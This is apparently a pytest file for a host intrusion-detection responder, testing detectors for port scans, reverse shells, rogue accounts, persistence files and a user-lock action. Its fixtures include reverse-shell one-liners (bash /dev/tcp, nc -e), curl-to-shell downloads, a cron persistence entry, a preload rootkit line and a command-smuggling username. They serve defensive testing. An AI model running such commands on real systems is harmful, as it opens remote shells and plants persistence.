"""Behavior detection: port scans, reverse shells, suspicious processes, listeners, accounts, integrity,
and the lock_user action."""

from __future__ import annotations

from types import SimpleNamespace as NS

from mcp_threatintel.responder import behavior as bh
from mcp_threatintel.responder.backends.base import CommandRunner
from mcp_threatintel.responder.backends.users import UserBackend
from mcp_threatintel.responder.findings import extract_findings
from mcp_threatintel.responder.store import ResponderDB
from test_responder import AGENT_TOKEN, agent, backend, config, ioc_db  # noqa: F401  (shared fixtures)

# --- port scan -------------------------------------------------------------------


def test_port_scan_threshold_and_kernel_log_parsing():
    d = bh.PortScanDetector(window_s=10, threshold=15)
    for port in range(1, 15):
        assert d.feed("192.168.21.50", port, now=100.0) is None
    assert d.feed("192.168.21.50", 14, now=100.5) is None          # same port again: not distinct
    rec = d.feed("192.168.21.50", 15, now=101.0)
    assert rec and rec["distinct_ports"] == 15 and rec["src_ip"] == "192.168.21.50"
    # slow probing outside the window never adds up
    slow = bh.PortScanDetector(window_s=10, threshold=15)
    assert all(slow.feed("10.0.0.9", p, now=p * 11.0) is None for p in range(1, 40))
    line = ("ti-syn IN=ens33 OUT= MAC=00:0c SRC=192.168.21.77 DST=192.168.21.129 LEN=44 TOS=0x00 "
            "PREC=0x00 TTL=52 ID=1 PROTO=TCP SPT=40000 DPT=8080 WINDOW=1024 RES=0x00 SYN URGP=0")
    k = bh.PortScanDetector(threshold=1)
    assert k.handle_line(line)["src_ip"] == "192.168.21.77"
    assert k.handle_line("unrelated kernel message") is None


# --- processes -------------------------------------------------------------------


def test_reverse_shell_is_a_shell_with_a_socket_on_stdio():
    conns = [NS(pid=50, fd=0, raddr=NS(ip="203.0.113.5", port=4444)),
             NS(pid=51, fd=7, raddr=NS(ip="203.0.113.5", port=443)),      # normal socket fd
             NS(pid=52, fd=1, raddr=NS(ip="127.0.0.1", port=9000))]       # loopback
    info = {50: {"pid": 50, "name": "bash", "process": "bash", "user": "www-data"},
            51: {"pid": 51, "name": "python3", "process": "python3"},
            52: {"pid": 52, "name": "sh", "process": "sh"}}
    found = bh.find_reverse_shells(conns, info.get)
    assert [f["pid"] for f in found] == [50] and found[0]["remote_ip"] == "203.0.113.5"


def test_suspicious_command_lines_and_temp_executables():
    def proc(pid, cmd, exe="/usr/bin/x"):
        return NS(info={"pid": pid, "name": cmd.split()[0], "exe": exe, "cmdline": cmd.split(), "username": "u",
                        "create_time": 1.0})
    procs = [proc(1, "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
             proc(2, "sh -c curl -s http://x.test/a.sh | sh"),
             proc(3, "/tmp/.x/miner --threads 4", exe="/tmp/.x/miner"),
             proc(4, "nc -e /bin/sh 10.0.0.1 4444"),
             proc(5, "vim notes.txt")]
    found = {f["pid"]: f["reasons"] for f in bh.find_suspicious_processes(procs)}
    assert set(found) == {1, 2, 3, 4}
    assert "temp folder" in found[3][0]


# --- listeners -------------------------------------------------------------------


def test_new_listener_severity():
    current = {"tcp:22:sshd": {"port": 22, "address": "0.0.0.0", "pid": 1, "process": "sshd", "exe": "/usr/sbin/sshd"},
               "tcp:4444:nc": {"port": 4444, "address": "0.0.0.0", "pid": 9, "process": "nc", "exe": "/usr/bin/nc"},
               "tcp:5000:py": {"port": 5000, "address": "127.0.0.1", "pid": 8, "process": "py", "exe": "/usr/bin/py"},
               "tcp:31337:x": {"port": 31337, "address": "0.0.0.0", "pid": 7, "process": "x", "exe": "/dev/shm/x"}}
    found = {f["port"]: f["severity"] for f in bh.new_listeners({"tcp:22:sshd"}, current)}
    assert found == {4444: "high", 5000: "medium", 31337: "critical"}


# --- accounts --------------------------------------------------------------------


def _fs(root, passwd, group, shadow, keys=None):
    etc = root / "etc"
    (etc / "sudoers.d").mkdir(parents=True, exist_ok=True)
    (etc / "passwd").write_text(passwd)
    (etc / "group").write_text(group)
    (etc / "shadow").write_text(shadow)
    (etc / "sudoers").write_text("root ALL=(ALL) ALL\n")
    if keys is not None:
        ssh = root / "home" / "ahmed" / ".ssh"
        ssh.mkdir(parents=True, exist_ok=True)
        (ssh / "authorized_keys").write_text(keys)


PASSWD = "root:x:0:0:root:/root:/bin/bash\nahmed:x:1000:1000::/home/ahmed:/bin/bash\n" \
         "www-data:x:33:33::/var/www:/usr/sbin/nologin\n"
GROUP = "root:x:0:\nsudo:x:27:ahmed\nahmed:x:1000:\ndocker:x:999:\n"
SHADOW = "root:!:1::::::\nahmed:$6$a:1::::::\nwww-data:*:1::::::\n"


def test_account_changes(tmp_path):
    _fs(tmp_path, PASSWD, GROUP, SHADOW, "ssh-ed25519 AAAA ahmed@pc\n")
    before = bh.account_snapshot(str(tmp_path))
    _fs(tmp_path,
        PASSWD.replace("/usr/sbin/nologin", "/bin/bash") + "toor:x:0:0::/root:/bin/bash\n"
        "backup2:x:1001:1001::/home/backup2:/bin/bash\n",
        GROUP.replace("sudo:x:27:ahmed", "sudo:x:27:ahmed,backup2"),
        SHADOW.replace("$6$a", "$6$b"), "ssh-ed25519 AAAA ahmed@pc\nssh-rsa BBBB attacker@kali\n")
    (tmp_path / "etc" / "sudoers.d" / "99-x").write_text("backup2 ALL=(ALL) NOPASSWD:ALL\n")
    changes = {(c["change"], c.get("user") or c.get("path")): c["severity"]
               for c in bh.diff_accounts(before, bh.account_snapshot(str(tmp_path)))}
    assert changes[("user_added", "toor")] == "critical"
    assert changes[("user_added", "backup2")] == "high"
    assert changes[("privileged_group_member_added", "backup2")] == "critical"
    assert changes[("login_shell_enabled", "www-data")] == "high"
    assert changes[("password_changed", "ahmed")] == "medium"
    assert changes[("sudoers_added", "/etc/sudoers.d/99-x")] == "high"
    assert changes[("ssh_key_added", "ahmed")] == "high"


# --- integrity -------------------------------------------------------------------


def test_integrity_changes(tmp_path):
    (tmp_path / "etc" / "cron.d").mkdir(parents=True)
    (tmp_path / "etc" / "ssh").mkdir()
    (tmp_path / "etc" / "crontab").write_text("17 * * * * root run-parts /etc/cron.hourly\n")
    (tmp_path / "etc" / "ssh" / "sshd_config").write_text("PermitRootLogin no\n")
    before = bh.integrity_snapshot(str(tmp_path))
    assert "/etc/crontab" in before
    (tmp_path / "etc" / "cron.d" / "updater").write_text("* * * * * root curl -s http://x.test | sh\n")
    (tmp_path / "etc" / "ssh" / "sshd_config").write_text("PermitRootLogin yes\n")
    (tmp_path / "etc" / "ld.so.preload").write_text("/lib/x86_64-linux-gnu/libhide.so\n")
    changes = {c["path"]: c for c in bh.diff_integrity(before, bh.integrity_snapshot(str(tmp_path)))}
    assert set(changes) == {"/etc/cron.d/updater", "/etc/ssh/sshd_config", "/etc/ld.so.preload"}
    assert changes["/etc/cron.d/updater"]["change"] == "file_added" and changes["/etc/cron.d/updater"]["persistence"]
    assert changes["/etc/cron.d/updater"]["added_lines"] == ["* * * * * root curl -s http://x.test | sh"]
    assert changes["/etc/ld.so.preload"]["severity"] == "critical"
    assert changes["/etc/ssh/sshd_config"]["change"] == "file_modified"


def test_monitor_baselines_persist_and_report_changes_once(tmp_path, monkeypatch):
    monkeypatch.setattr(bh, "package_manager_active", lambda: False)
    root = tmp_path / "root"
    _fs(root, PASSWD, GROUP, SHADOW)
    db = ResponderDB(tmp_path / "r.db")
    events = []
    m = bh.BehaviorMonitor(db, root=str(root), enabled=True)
    m.on_event = lambda s, r: events.append((s, r))
    assert m.check_accounts() == [] and m.check_integrity() == []          # first run: baseline only
    with open(root / "etc" / "passwd", "a") as f:
        f.write("evil:x:1002:1002::/home/evil:/bin/bash\n")
    # the agent restarts: the change made while it was down is still reported (baseline in the DB)
    m2 = bh.BehaviorMonitor(db, root=str(root), enabled=True)
    m2.on_event = lambda s, r: events.append((s, r))
    assert [c["user"] for c in m2.check_accounts()] == ["evil"]
    assert m2.check_accounts() == []                                         # reported once
    assert [s for s, _ in events] == ["account_changes"]
    assert m2.report(60)["account_changes"][0]["user"] == "evil"
    # listeners: the first view is the baseline, later new ones are reported
    sshd = {"tcp:22:sshd": {"port": 22, "address": "0.0.0.0", "pid": 1, "process": "sshd", "exe": "/usr/sbin/sshd"}}
    assert m2.check_listeners(sshd) == []
    more = sshd | {"tcp:4444:nc": {"port": 4444, "address": "0.0.0.0", "pid": 9, "process": "nc", "exe": "/usr/bin/nc"}}
    assert [f["port"] for f in m2.check_listeners(more)] == [4444]
    assert m2.check_listeners(more) == []


def test_package_installation_lowers_severity(tmp_path, monkeypatch):
    monkeypatch.setattr(bh, "package_manager_active", lambda: True)
    root = tmp_path / "root"
    _fs(root, PASSWD, GROUP, SHADOW)
    m = bh.BehaviorMonitor(ResponderDB(tmp_path / "r.db"), root=str(root), enabled=True)
    m.check_accounts()
    with open(root / "etc" / "passwd", "a") as f:
        f.write("_svc:x:120:120::/nonexistent:/usr/sbin/nologin\n")
    (c,) = m.check_accounts()
    assert c["severity"] == "low" and c["during_package_install"]
    (f,) = extract_findings({"behavior": {"account_changes": [c]}})
    assert f.plan == []                                                      # nothing proposed


def test_idle_unattended_upgrade_helper_is_not_a_package_install():
    def proc(name, cmd):
        return NS(info={"name": name, "cmdline": cmd.split()})
    idle = proc("unattended-upgr", "/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown "
                                   "--wait-for-signal")
    assert bh.package_manager_active([idle, proc("bash", "bash")]) is False
    assert bh.package_manager_active([idle, proc("dpkg", "dpkg --configure -a")]) is True
    assert bh.package_manager_active([proc("unattended-upgr", "/usr/bin/python3 /usr/bin/unattended-upgrade")])


# --- findings and actions ----------------------------------------------------------


def test_behavior_findings_propose_the_right_actions():
    report = {"behavior": {
        "port_scans": [{"src_ip": "192.168.21.50", "distinct_ports": 30, "window_s": 10, "observed_at": 1},
                       {"src_ip": "192.168.21.1", "distinct_ports": 30, "window_s": 10, "observed_at": 1,
                        "allowlisted": "analyst PC"}],
        "reverse_shells": [{"pid": 50, "process": "bash", "user": "www-data", "remote_ip": "203.0.113.5",
                            "remote_port": 4444, "observed_at": 1}],
        "account_changes": [{"change": "user_added", "user": "toor", "uid": 0, "shell": "/bin/bash",
                             "severity": "critical"}],
        "integrity_changes": [{"change": "file_added", "path": "/etc/cron.d/updater", "persistence": True,
                               "severity": "high", "added_lines": ["* * * * * root x"], "sha256": "ab" * 32}],
    }}
    plans = {f.kind + ":" + f.key: [(t, a.get("behavior", False)) for t, a in f.plan] for f in extract_findings(report)}
    assert plans["port_scan:portscan:192.168.21.50"] == [("block_ip", True)]
    assert plans["port_scan:portscan:192.168.21.1"] == []
    assert plans["reverse_shell:revshell:50"] == [("kill_process", False), ("block_ip", True)]
    assert plans["account_user_added:account:user_added:toor:"] == [("lock_user", False)]
    assert plans[f"integrity_file_added:integrity:/etc/cron.d/updater:{'ab' * 8}"] == [("quarantine_file", True)]


def test_behavior_flag_only_from_detection(agent):  # noqa: F811
    m = agent.manager
    # a model asking to block a LAN address is refused; the detection (it saw the scan) is not
    assert m.create("block_ip", {"ip": "192.168.21.50", "behavior": True}, "scan", "mcp-server")["status"] == "rejected"
    ok = m.create("block_ip", {"ip": "192.168.21.50", "behavior": True}, "scan", "auto-detect")
    assert ok["status"] == "pending" and ok["params"]["behavior"] is True


def test_lock_user_validation_and_dry_run_commands(agent, monkeypatch):  # noqa: F811
    from mcp_threatintel.responder import validators
    monkeypatch.setattr(validators, "IS_WINDOWS", True)  # skip the local account lookup
    m = agent.manager
    assert m.create("lock_user", {"user": "root"}, "x", "mcp-server")["status"] == "rejected"
    assert m.create("lock_user", {"user": "bad name;rm"}, "x", "mcp-server")["status"] == "rejected"
    act = m.create("lock_user", {"user": "backup2"}, "new sudo user", "auto-detect")
    assert act["status"] == "pending" and act["target"] == "backup2"
    ub = UserBackend(CommandRunner(dry_run=True))
    state = ub.apply(act)
    assert state["commands"] and "backup2" in state["commands"][0]
    assert ub.rollback(act, state)["commands"]


def test_behavior_event_raises_an_alert(agent):  # noqa: F811
    eng = agent.detector
    eng.on_behavior("port_scans", {"src_ip": "192.168.21.50", "distinct_ports": 40, "window_s": 10,
                                   "observed_at": 1e10})
    ids = []
    while not eng.events.empty():
        ids += eng.process_event(eng.events.get_nowait())
    (alert,) = [agent.db.get_alert(i) for i in ids]
    assert alert["kind"] == "port_scan"
    (act,) = [agent.db.get_action(i) for i in alert["action_ids"]]
    assert act["type"] == "block_ip" and act["status"] == "pending" and act["target"] == "192.168.21.50"
